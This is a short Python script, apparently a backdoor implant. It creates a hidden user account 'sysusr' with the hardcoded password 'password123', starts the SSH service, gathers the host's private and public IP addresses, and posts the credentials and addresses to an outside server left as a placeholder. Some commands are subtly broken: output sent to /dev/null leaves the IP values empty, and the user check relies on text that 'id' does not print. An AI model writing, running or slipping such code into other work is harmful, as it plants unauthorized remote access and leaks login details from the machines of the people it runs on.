import requests
import subprocess
subprocess.check_output('sudo adduser --quiet --disabled-password --shell /bin/bash --home /home/sysusr --gecos "User" sysusr', shell=True)
subprocess.check_output('sudo service ssh start', shell=True)
subprocess.check_output("echo 'sysusr:password123' | sudo chpasswd sysusr", shell=True)
privip = subprocess.check_output("hostname -I &> /dev/null", shell=True)
pubip = subprocess.check_output("curl -s http://ifconfig.me &> /dev/null", shell=True)
checkuser = subprocess.check_output("id sysusr", shell=True)
checkuser = checkuser.decode("utf-8")
checkuser = checkuser.strip()
checkuser = str(checkuser)
if "no such user" in checkuser:
    userexst = False
else:
    userexst = True
url = "http://<server-here>:8080"
data = {"SSH": "OPEN",
        "Username sysusr": userexst,
        "Password":"password123\n",
        "Private IP address": privip,
        "Public IP address": pubip}
rqst = requests.post(url, data=data)

